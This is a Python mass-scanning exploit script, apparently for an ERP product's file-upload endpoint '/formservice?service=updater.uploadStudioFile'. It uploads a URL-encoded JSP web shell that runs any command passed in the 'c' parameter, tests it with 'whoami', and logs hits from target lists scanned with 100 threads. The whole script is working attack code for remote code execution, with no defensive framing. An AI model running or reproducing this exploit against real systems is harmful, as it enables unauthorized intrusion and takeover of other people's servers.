import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

███████╗██╗   ██╗███████╗██████╗ ██████╗ ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
╚══███╔╝╚██╗ ██╔╝██╔════╝██╔══██╗██╔══██╗██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
  ███╔╝  ╚████╔╝ █████╗  ██████╔╝██████╔╝██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
 ███╔╝    ╚██╔╝  ██╔══╝  ██╔══██╗██╔═══╝ ██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
███████╗   ██║   ███████╗██║  ██║██║     ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                                                                                            
                                                                                                                                          
                                                                            version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/formservice?service=updater.uploadStudioFile"
    url = target+payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Content-Length': '1098',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip',
        'Connection': 'close'
    }
    data = 'content=<?xml%20version="1.0"?><root><filename>ceshi.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%22%29%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%69%6e%74%20%61%20%3d%20%2d%31%3b%62%79%74%65%5b%5d%20%62%20%3d%20%6e%65%77%20%62%79%74%65%5b%32%30%34%38%5d%3b%6f%75%74%2e%70%72%69%6e%74%28%22%3c%70%72%65%3e%22%29%3b%77%68%69%6c%65%28%28%61%3d%69%6e%2e%72%65%61%64%28%62%29%29%21%3d%2d%31%29%7b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%53%74%72%69%6e%67%28%62%2c%30%2c%61%29%29%3b%7d%6f%75%74%2e%70%72%69%6e%74%28%22%3c%2f%70%72%65%3e%22%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%25%3e-->'
    url1 = target+"/update/temp/studio/ceshi.jsp"
    headers1 = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Content-Length': '8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip',
        'Connection': 'close'
    }
    data1 = 'c=whoami'
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        res1 = requests.post(url=url1,headers=headers1,data=data1,verify=False,timeout=10)
        if res.status_code == 200 and 'root' in res1.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()